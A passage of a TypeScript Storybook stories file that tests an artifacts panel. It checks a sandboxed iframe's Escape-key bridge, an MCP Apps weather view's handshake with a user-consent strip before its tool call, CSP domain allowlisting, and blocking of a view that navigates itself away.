  window.addEventListener("load", function () {
    window.dispatchEvent(new KeyboardEvent("keydown", { key: "Escape", bubbles: true }));
    parent.postMessage({ xumBridgeTest: "sent-escape" }, "*");
  });
</script></head><body><p>bridge test</p></body></html>`;

let bridgeEscapes = 0;
export const BridgeEscapeExitsFullscreen: Story = {
  parameters: { pixel: PIXEL_DISABLED },
  beforeEach: () => {
    bridgeEscapes = 0;
    const handler = (event: MessageEvent) => {
      if ((event.data as { xumBridgeTest?: string } | null)?.xumBridgeTest === "sent-escape") {
        bridgeEscapes += 1;
      }
    };
    window.addEventListener("message", handler);
    return () => window.removeEventListener("message", handler);
  },
  render: () => renderPanel("bridge.html", { "bridge.html": ok("bridge.html", BRIDGE_HTML) }),
  play: async ({ canvasElement }) => {
    const canvas = within(canvasElement);
    await canvas.findByTestId("artifact-frame");
    await waitFor(() => expect(bridgeEscapes).toBeGreaterThanOrEqual(1));
    const before = bridgeEscapes;
    await userEvent.click(canvas.getByRole("button", { name: "Fullscreen" }));
    // The overlay's frame sends Escape on load; the host must leave fullscreen.
    await waitFor(() => expect(bridgeEscapes).toBeGreaterThan(before), { timeout: 10000 });
    await waitFor(() =>
      expect(canvasElement.ownerDocument.querySelector('[role="dialog"]')).toBeNull()
    );
  },
};

// MCP Apps view (artifacts experiment): a fake server view implementing the spec handshake.
// The frame is opaque-origin, so the play test reads progress from the heights the view
// reports: 321px only after initialize -> initialized -> tool-input -> tool-result, then
// 333px once its own tools/call round trip (behind the consent strip) succeeded.
const MCP_APP_TOOL_CALL_ID = "call-weather-1";
const MCP_APP_VIEW_HTML = `<!doctype html>
<html>
<head>
<style>
  body { font-family: system-ui, sans-serif; margin: 0; padding: 16px; color: #0f172a; }
  h1 { font-size: 16px; margin: 0 0 8px; }
  li { font-size: 13px; }
</style>
</head>
<body>
  <h1>Weather view</h1>
  <ul id="log"></ul>
  <script>
    const seen = {};
    let nextId = 1;
    const pending = new Map();
    const log = (text) => {
      const li = document.createElement("li");
      li.textContent = text;
      document.getElementById("log").appendChild(li);
    };
    const send = (message) => window.parent.postMessage(message, "*");
    const request = (method, params) =>
      new Promise((resolve, reject) => {
        const id = nextId++;
        pending.set(id, { resolve, reject });
        send({ jsonrpc: "2.0", id, method, params });
      });
    const notify = (method, params) => send({ jsonrpc: "2.0", method, params });
    const maybeReady = () => {
      if (!(seen.init && seen.input && seen.result) || seen.sized) return;
      seen.sized = true;
      notify("ui/notifications/size-changed", { width: 400, height: 321 });
      request("tools/call", { name: "get_forecast", arguments: { city: "Berlin" } }).then(
        (result) => {
          log("Forecast: " + result.content[0].text);
          notify("ui/notifications/size-changed", { width: 400, height: 333 });
        },
        (error) => log("tools/call failed: " + error.message)
      );
    };
    window.addEventListener("message", (event) => {
      const message = event.data;
      if (message.id !== undefined && pending.has(message.id)) {
        const entry = pending.get(message.id);
        pending.delete(message.id);
        if (message.error) entry.reject(message.error);
        else entry.resolve(message.result);
        return;
      }
      if (message.method === "ui/resource-teardown") {
        send({ jsonrpc: "2.0", id: message.id, result: {} });
      } else if (message.method === "ui/notifications/tool-input") {
        seen.input = true;
        log("Input: " + JSON.stringify(message.params.arguments));
      } else if (message.method === "ui/notifications/tool-result") {
        seen.result = true;
        log("Result: " + message.params.content[0].text);
      }
      maybeReady();
    });
    request("ui/initialize", {
      protocolVersion: "2026-01-26",
      appInfo: { name: "weather-view", version: "1.0.0" },
      appCapabilities: {},
    }).then((result) => {
      seen.init = true;
      log("Host theme: " + result.hostContext.theme);
      notify("ui/notifications/initialized", {});
      maybeReady();
    });
  </script>
</body>
</html>`;

/**
 * MCP App views mount only in the desktop app (executableFrames.ts). Storybook has no preload
 * bridge, so these stories stand one in and restore the original afterwards.
 */
function DesktopApiStub(props: { children: ReactNode }) {
  const originalApiRef = useRef(window.api);
  window.api = {
    platform: "linux",
    versions: { node: "20.0.0", chrome: "120.0.0", electron: "28.0.0" },
    getIsRosetta: () => Promise.resolve(false),
  };
  useEffect(() => {
    const savedApi = originalApiRef.current;
    return () => {
      window.api = savedApi;
    };
  }, []);
  return <>{props.children}</>;
}

function renderMcpAppView(html: string = MCP_APP_VIEW_HTML) {
  updatePersistedState(ARTIFACTS_ALLOW_CDN_SCRIPTS_KEY, true);
  openMcpAppView(WORKSPACE_ID, {
    toolCallId: MCP_APP_TOOL_CALL_ID,
    serverName: "weather",
    resourceUri: "ui://weather/view.html",
    toolName: "show_weather",
    label: "Show weather",
    arguments: { city: "Berlin" },
    cancelled: false,
  });
  return (
    <APIProvider
      client={createMockORPCClient({
        artifacts: { listing: listingFor(FILES), files: FILES },
        mcpApps: {
          views: {
            [MCP_APP_TOOL_CALL_ID]: {
              html,
              // jsdelivr is on the CDN allowlist; the tile host is not, so it is listed as
              // not granted.
              csp: { resourceDomains: ["https://cdn.jsdelivr.net", "https://tiles.example.com"] },
              prefersBorder: null,
              resultAvailable: true,
              result: { content: [{ type: "text", text: "Berlin: 18°C, light rain" }] },
              invocation: {
                serverName: "weather",
                toolName: "show_weather",
                arguments: { city: "Berlin" },
              },
            },
          },
          // get_forecast is visible to the model too: the first call needs the user's consent.
          callTool: (input) =>
            input.consented
              ? { status: "ok", result: { content: [{ type: "text", text: "Sunny tomorrow" }] } }
              : { status: "consent_required" },
        },
      })}
    >
      <DesktopApiStub>
        <div className="bg-background flex h-screen justify-end">
          <div className="bg-sidebar border-border-light h-full w-full max-w-[440px] border-l">
            <ArtifactsPanel workspaceId={WORKSPACE_ID} />
          </div>
        </div>
      </DesktopApiStub>
    </APIProvider>
  );
}

const playMcpAppView = async (canvasElement: HTMLElement) => {
  const canvas = within(canvasElement);
  const frame = await canvas.findByTestId("mcp-app-frame");
  await expect(frame.getAttribute("sandbox")).toBe("allow-scripts");
  await canvas.findByText(/Not granted to this view: https:\/\/tiles\.example\.com/);
  await waitFor(() => expect(frame.style.height).toBe("321px"), { timeout: 5000 });
  const strip = await canvas.findByRole("alert");
  await expect(strip.textContent).toContain("Allow get_forecast from weather?");
  // Allow arms shortly after the strip appears (confirmArming.ts).
  const allow = within(strip).getByRole("button", { name: "Allow" });
  await waitFor(() => expect(allow).toBeEnabled(), { timeout: 5000 });
  await userEvent.click(allow);
  await waitFor(() => expect(frame.style.height).toBe("333px"), { timeout: 5000 });
};

export const McpAppViewLaptop: Story = {
  ...LAPTOP,
  render: () => renderMcpAppView(),
  play: ({ canvasElement }) => playMcpAppView(canvasElement),
};
export const McpAppViewPhone: Story = {
  ...PHONE,
  render: () => renderMcpAppView(),
  play: ({ canvasElement }) => playMcpAppView(canvasElement),
};

// An MCP view that navigates itself away loses its host: no more messages either way.
export const McpAppViewNavigateAway: Story = {
  parameters: { pixel: PIXEL_DISABLED },
  render: () => renderMcpAppView(navigateAwayHtml("location")),
  play: async ({ canvasElement }) => {
    const canvas = within(canvasElement);
    await canvas.findByText(/This artifact navigated away/, undefined, { timeout: 10000 });
    await expect(canvas.queryByTestId("mcp-app-frame")).toBeNull();
  },
};
